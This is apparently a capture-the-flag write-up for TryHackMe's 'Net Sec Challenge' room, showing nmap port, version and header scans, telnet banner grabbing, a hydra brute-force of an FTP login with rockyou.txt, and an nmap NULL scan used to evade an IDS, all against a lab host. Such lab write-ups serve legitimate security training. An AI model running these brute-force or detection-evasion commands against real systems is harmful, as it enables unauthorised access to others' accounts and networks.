# Net Sec Challenge by TryHackMe
Net Sec Challenge by TryHackMe [https://tryhackme.com/room/netsecchallenge]


All the questions can be solved by using `nmap`, `telnet`, and `hydra`.

### Q1: What is the highest port number being open less than 10,000?
**Solution:**
```
nmap TARGET_IP -p 1-10000
```
Upon doing this, the following result will show up
```
nmap 10.48.184.244 -p 1-10000
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-10 07:05 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.184.244
Host is up (0.0055s latency).
Not shown: 9995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

```
So, as per the question, the answer is **port 8080**.

You can also use flags such as `-n` for no reverse dns or `-Pn` to scan ports only. However, the result will be the same.

### Q2: There is an open port outside the common 1000 ports; it is above 10,000. What is it?

**Solution:**

By default, `nmap` scan top 1000 ports. Since the question asks for a port number that is beyond 10,000, we need to pass a port range using the `-p` flag.

```
nmap -n -Pn TARGET_IP -p 10000-65535
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-10 07:21 GMT
Nmap scan report for 10.48.184.244
Host is up (0.0042s latency).
Not shown: 55535 closed ports
PORT      STATE SERVICE
10021/tcp open  unknown

```
This command will scan all the ports from 10,000 to 65,535.

### Q3: How many TCP ports are open?
**Solution**:

Count the TCP open ports to get the answer.

### Q4: What is the flag hidden in the HTTP server header?
**Solution**:

First, we need to check on which port the HTTP server is running. From the previous result, it is port 80.

To know more information about the HTTP server header, we need to pass the `--script=http-headers` option in the command.
```
nmap -n -Pn --script=http-headers -p 80
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-10 07:30 GMT
Nmap scan report for 10.48.184.244
Host is up (0.015s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-headers: 
|   Content-Type: text/html
|   Accept-Ranges: bytes
|   ETag: "229449419"
|   Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
|   Content-Length: 226
|   Connection: close
|   Date: Tue, 10 Mar 2026 07:30:35 GMT
|   Server: lighttpd THM{web_********2}
|   
|_  (Request type: HEAD)

```
### Q5: What is the flag hidden in the SSH server header?
**Solution:**

The SSH server is running on port 22.

We can use `telnet` to connect to the SSH server
```
telnet TARGET_IP 22
```
```
Trying 10.48.184.244...
Connected to 10.48.184.244.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{9*********9}
```
It gives you the SSH version and the hidden flag.

### Q6: We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
**Solution:**

Since the FTP server is listening on a non-standard port, we need to pass a port range from 1-65535. To know the service version, we can use the flag `-sV`.

```
nmap -n -Pn -sV TARGET_IP -p 1-65535
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-10 07:45 GMT
Nmap scan report for 10.48.184.244
Host is up (0.0028s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
10021/tcp open  ftp         vsftpd 3.0.5

```

### Q7: We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
**Solution:**

We have the usernames, but not the password, which we can use to connect to the FTP server.

To get the password, we use the tool `hydra` to brute-force the password using the wordlist `rockyou.txt`, which is located in `/usr/share/wordlists/rockyou.txt`.
```
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.48.184.244:10021
```
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 07:54:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.48.184.244:10021/
[10021][ftp] host: 10.48.184.244   login: quinn   password: a****a
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 07:54:33

```
We get the password `a****a` for the username `quinn`. Use this credential to connect the FTP server
```
ftp 10.48.184.244 10021
```
```
Connected to 10.48.184.244.
220 (vsFTPd 3.0.5)
Name (10.48.184.244:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (35.8737 kB/s)
ftp> quit
221 Goodbye.
```
After getting the ftp_flag.txt, view it using `cat`.
```
root@ip-10-48-117-52:~# ls
burp.json   Downloads     Pictures  Scripts            Tools
CTFBuilder  ftp_flag.txt  Postman   snap
Desktop     Instructions  Rooms     thinclient_drives
root@ip-10-48-117-52:~# cat ftp_flag.txt 
THM{32********98}
root@ip-10-48-117-52:~# 
```

### Q8: Browsing to `TARGET_IP:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?
**Solution:**

![screetshot of http://TARGET_IP:8080](/question8.png)

You need to wirte a nmap command such that you can perform a network scan while being undetected by the IDS, or keep the detection percentage as low as possible.
```
nmap -sN TARGET_IP
```
If your detection is less than 11%, you should get the flag.
